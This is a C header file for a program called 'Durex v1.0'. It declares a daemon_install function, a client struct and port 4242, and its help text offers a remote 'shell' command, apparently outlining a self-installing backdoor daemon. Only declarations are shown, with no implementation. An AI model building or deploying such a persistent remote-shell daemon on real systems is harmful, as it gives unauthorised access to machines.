#ifndef MD_H
# define MD_H

#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <pwd.h>

#define PORT       4242
#define MAX 3

#define HELP "Durex v1.0: Available command:\nhelp\nshell\nquit\n"

typedef struct	s_client {
	int pid;
	int socket;
}				t_client;

int		main(int argc, char **argv);
int		durex(int argc, char **argv);
void	daemon_install(void);

#endif
